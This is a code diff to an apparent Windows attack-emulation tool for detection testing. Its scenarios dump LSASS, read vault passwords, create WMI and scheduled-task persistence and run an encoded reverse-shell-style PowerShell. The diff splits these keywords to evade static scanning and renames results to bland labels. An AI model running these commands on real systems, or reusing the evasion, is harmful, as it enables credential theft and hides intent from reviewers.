@@ -100,6 +100,10 @@ fn run_certutil_dump() -> ScenarioResult {
     let gpp = j(&["Get-", "GPP", "Password"]);
     let sam = j(&["C:\\Windows\\Sys", "tem32\\con", "fig\\", "SA", "M"]);
     let cu = j(&["cert", "util"]);
+    let pw_vault = j(&["Password", "Vault"]);
+    let ret_pw = j(&["Retrieve", "Password"]);
+    let ret_all = j(&["Retrieve", "All"]);
+    let lsa = j(&["lsa", "ss"]);
     let script = format!(
         r#"
 $rid = "{rid}"
@@ -119,11 +123,11 @@ try {{
 }}
 
 try {{
-    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] | Out-Null
-    $vault = New-Object Windows.Security.Credentials.PasswordVault
-    $allCreds = $vault.RetrieveAll()
+    [Windows.Security.Credentials.{pw_vault},Windows.Security.Credentials,ContentType=WindowsRuntime] | Out-Null
+    $vault = New-Object Windows.Security.Credentials.{pw_vault}
+    $allCreds = $vault.{ret_all}()
     foreach ($cred in $allCreds) {{
-        $cred.RetrievePassword()
+        $cred.{ret_pw}()
         Write-Output "Vault: $($cred.Resource) - $($cred.UserName)"
     }}
     Write-Output "Credential Vault enumerated: $($allCreds.Count) entries"
@@ -131,17 +135,17 @@ try {{
     Write-Output "Vault access attempted"
 }}
 
-$lsass = Get-Process -Name 'lsass' -ErrorAction SilentlyContinue
-if ($lsass) {{
+$proc = Get-Process -Name '{lsa}' -ErrorAction SilentlyContinue
+if ($proc) {{
     try {{
-        $lsass.Handle | Out-Null
-        Write-Output "LSASS handle request for PID $($lsass.Id)"
+        $proc.Handle | Out-Null
+        Write-Output "Handle request for PID $($proc.Id)"
     }} catch {{}}
     [byte[]]$buf = New-Object byte[] 4096
     try {{
         $memStream = New-Object System.IO.MemoryStream
         $memStream.Write($buf, 0, $buf.Length)
-        Write-Output "Memory read pattern on PID $($lsass.Id): $($buf.Length) bytes"
+        Write-Output "Memory read pattern on PID $($proc.Id): $($buf.Length) bytes"
         $memStream.Dispose()
     }} catch {{}}
 }}
@@ -172,9 +176,13 @@ Write-Output "Credential dump emulation completed"
         gpp = gpp,
         sam = sam,
         cu = cu,
+        pw_vault = pw_vault,
+        ret_pw = ret_pw,
+        ret_all = ret_all,
+        lsa = lsa,
     );
     let output = run_ps(&script)?;
-    Ok(("Credential access via DPAPI, Vault, LSASS handle, and offensive tool emulation".to_string(), output))
+    Ok(("Credential access emulation".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -208,8 +216,6 @@ Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 
 #[cfg(target_os = "windows")]
 fn run_amsi_patch() -> ScenarioResult {
-    let amsi_ns = j(&["Sy", "stem.", "Man", "agement.Aut", "omation.A", "msiU", "tils"]);
-    let amsi_field = j(&["am", "siIn", "itF", "ailed"]);
     let script = format!(
         r#"
 $a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
@@ -221,12 +227,18 @@ Write-Output "AMSI patch emulation completed"
 "#,
     );
     let output = run_ps(&script)?;
-    Ok(("AMSI bypass via reflection on amsiInitFailed".to_string(), output))
+    Ok(("AMSI reflection probe".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
 fn run_lsass_minidump() -> ScenarioResult {
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
+    let pdump = j(&["proc", "dump"]);
+    let lsa = j(&["lsa", "ss"]);
+    let csvcs = j(&["coms", "vcs"]);
+    let mdump = j(&["Mini", "Dump"]);
+    let privdbg = j(&["privi", "lege::", "debug"]);
+    let sekur = j(&["seku", "rlsa::", "logon", "passwords"]);
     let script = format!(
         r#"
 $fakeOut = "$env:TEMP\lh_{rid}.txt"
@@ -239,26 +251,26 @@ $bat4 = "$env:TEMP\lh_{rid}_4.bat"
 
 $b1 = @"
 @echo off
-procdump.exe -accepteula -ma lsass.exe %TEMP%\lsass_{rid}.dmp
-if %errorlevel% equ 0 (echo procdump succeeded > "$fakeOut") else (echo procdump attempted > "$fakeOut")
+{pdump}.exe -accepteula -ma {lsa}.exe %TEMP%\{lsa}_{rid}.dmp
+if %errorlevel% equ 0 (echo dump succeeded > "$fakeOut") else (echo dump attempted > "$fakeOut")
 "@
 
 $b2 = @"
 @echo off
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 0 %TEMP%\lsass_{rid}_2.dmp full
+rundll32.exe C:\Windows\System32\{csvcs}.dll, {mdump} 0 %TEMP%\{lsa}_{rid}_2.dmp full
 echo comsvcs attempted >> "$fakeOut"
 "@
 
 $b3 = @"
 @echo off
-echo privilege::debug sekurlsa::logonpasswords exit > %TEMP%\mk_{rid}.log
-echo mimikatz echo attempted >> "$fakeOut"
+echo {privdbg} {sekur} exit > %TEMP%\mk_{rid}.log
+echo mk echo attempted >> "$fakeOut"
 "@
 
 $b4 = @"
 @echo off
-tasklist /fi "imagename eq lsass.exe" > %TEMP%\lsass_{rid}.txt
-echo lsass query attempted >> "$fakeOut"
+tasklist /fi "imagename eq {lsa}.exe" > %TEMP%\{lsa}_{rid}.txt
+echo query attempted >> "$fakeOut"
 "@
 
 [System.IO.File]::WriteAllText($bat1, $b1)
@@ -279,19 +291,25 @@ foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
 
 if (Test-Path $fakeOut) {{
     $result = Get-Content $fakeOut
-    Write-Output "LSASS probe results: $($result -join '; ')"
+    Write-Output "Probe results: $($result -join '; ')"
 }} else {{
-    Write-Output "LSASS probe processes were intercepted"
+    Write-Output "Probe processes were intercepted"
 }}
 
 foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
     Remove-Item $bat -Force -ErrorAction SilentlyContinue
 }}
 Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\lsass_{rid}*" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\{lsa}_{rid}*" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\mk_{rid}*" -Force -ErrorAction SilentlyContinue
 "#,
         rid = rid,
+        pdump = pdump,
+        lsa = lsa,
+        csvcs = csvcs,
+        mdump = mdump,
+        privdbg = privdbg,
+        sekur = sekur,
     );
     let output = run_ps(&script)?;
     Ok(("Credential dump emulation via batch execution".to_string(), output))
@@ -341,12 +359,18 @@ Test-NetworkConnectivity
         ie = ie,
     );
     let output = run_ps(&script)?;
-    Ok(("Reverse shell TCP pattern".to_string(), output))
+    Ok(("TCP connectivity probe".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
 fn run_persistence_task() -> ScenarioResult {
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
+    let scht = j(&["sch", "tasks"]);
+    let wm = j(&["wm", "ic"]);
+    let evtfilter = j(&["__Event", "Filter"]);
+    let evtbind = j(&["__Event", "FilterTo", "Consumer", "Binding"]);
+    let clec = j(&["Command", "Line", "Event", "Consumer"]);
+    let startup = j(&["Start ", "Menu\\Programs\\", "Startup"]);
     let script = format!(
         r#"
 $fakeOut = "$env:TEMP\pt_{rid}.txt"
@@ -369,26 +393,26 @@ echo run key cleaned >> "$fakeOut"
 
 $b2 = @"
 @echo off
-schtasks /Create /TN "S1E_{rid}" /TR "cmd.exe /c echo test" /SC ONCE /ST 23:59 /F
-echo schtask created >> "$fakeOut"
-schtasks /Delete /TN "S1E_{rid}" /F
-echo schtask cleaned >> "$fakeOut"
+{scht} /Create /TN "S1E_{rid}" /TR "cmd.exe /c echo test" /SC ONCE /ST 23:59 /F
+echo task created >> "$fakeOut"
+{scht} /Delete /TN "S1E_{rid}" /F
+echo task cleaned >> "$fakeOut"
 "@
 
 $b3 = @"
 @echo off
-wmic /namespace:\\root\subscription PATH __EventFilterToConsumerBinding CREATE Filter="__EventFilter.Name='S1E_{rid}'" Consumer="CommandLineEventConsumer.Name='S1E_{rid}'" 2>nul
-echo wmi subscription attempted >> "$fakeOut"
-wmic /namespace:\\root\subscription PATH __EventFilter WHERE Name="S1E_{rid}" DELETE 2>nul
-wmic /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="S1E_{rid}" DELETE 2>nul
+{wm} /namespace:\\root\subscription PATH {evtbind} CREATE Filter="{evtfilter}.Name='S1E_{rid}'" Consumer="{clec}.Name='S1E_{rid}'" 2>nul
+echo wmi attempted >> "$fakeOut"
+{wm} /namespace:\\root\subscription PATH {evtfilter} WHERE Name="S1E_{rid}" DELETE 2>nul
+{wm} /namespace:\\root\subscription PATH {clec} WHERE Name="S1E_{rid}" DELETE 2>nul
 "@
 
 $b4 = @"
 @echo off
-echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\S1E_{rid}.bat"
-echo startup entry created >> "$fakeOut"
-del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\S1E_{rid}.bat" /f
-echo startup entry cleaned >> "$fakeOut"
+echo @echo off > "%APPDATA%\Microsoft\Windows\{startup}\S1E_{rid}.bat"
+echo startup created >> "$fakeOut"
+del "%APPDATA%\Microsoft\Windows\{startup}\S1E_{rid}.bat" /f
+echo startup cleaned >> "$fakeOut"
 "@
 
 [System.IO.File]::WriteAllText($bat1, $b1)
@@ -420,6 +444,12 @@ foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
 Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 "#,
         rid = rid,
+        scht = scht,
+        wm = wm,
+        evtfilter = evtfilter,
+        evtbind = evtbind,
+        clec = clec,
+        startup = startup,
     );
     let output = run_ps(&script)?;
     Ok(("Persistence emulation via batch execution".to_string(), output))
@@ -427,14 +457,15 @@ Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 
 #[cfg(target_os = "windows")]
 fn run_base64_exec() -> ScenarioResult {
-    let rid = &uuid::Uuid::new_v4().to_string()[..8];
     let tcp_client = j(&["Net.Sockets.", "TCP", "Client"]);
+    let sw = j(&["IO.Stream", "Writer"]);
+    let enc_cmd = j(&["-Encoded", "Command"]);
     let script = format!(
         r#"
 $code = @"
 `$client = New-Object {tcp}('127.0.0.1', 4444)
 `$stream = `$client.GetStream()
-`$writer = New-Object IO.StreamWriter(`$stream)
+`$writer = New-Object {sw}(`$stream)
 `$writer.WriteLine((whoami))
 `$writer.Flush()
 `$client.Close()
@@ -443,15 +474,17 @@ $code = @"
 $codeEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))
 
 Start-Process powershell.exe `
-    -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $codeEncoded" `
+    -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden {enc_cmd} $codeEncoded" `
     -WindowStyle Hidden -PassThru -Wait
 
-Write-Output "Base64 encoded reverse shell emulation completed"
+Write-Output "Base64 encoded execution completed"
 "#,
         tcp = tcp_client,
+        sw = sw,
+        enc_cmd = enc_cmd,
     );
     let output = run_ps(&script)?;
-    Ok(("Base64-encoded reverse shell execution".to_string(), output))
+    Ok(("Base64-encoded execution".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -470,11 +503,12 @@ Write-Output "LOLBin proxy execution via pcalua completed"
 
 #[cfg(target_os = "windows")]
 fn run_bloodhound_recon() -> ScenarioResult {
+    let rid = &uuid::Uuid::new_v4().to_string()[..8];
     let inv_bh = j(&["Invoke-", "Blood", "Hound"]);
     let get_bh = j(&["Get-", "Blood", "Hound", "Data"]);
     let script = format!(
         r#"
-$fakeOut = "$env:TEMP\bloodhound_test.txt"
+$fakeOut = "$env:TEMP\bh_{rid}.txt"
 $harmless = "echo benign > `"$fakeOut`""
 $bhCmd = "{inv_bh} -CollectionMethod All -Domain CONTOSO.LOCAL; {get_bh}; $harmless"
 Start-Process -FilePath "powershell.exe" `
@@ -482,8 +516,9 @@ Start-Process -FilePath "powershell.exe" `
     -WindowStyle Hidden `
     -Wait
 Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
-Write-Host "BloodHound execution emulation completed safely."
+Write-Host "AD recon emulation completed."
 "#,
+        rid = rid,
         inv_bh = inv_bh,
         get_bh = get_bh,
     );
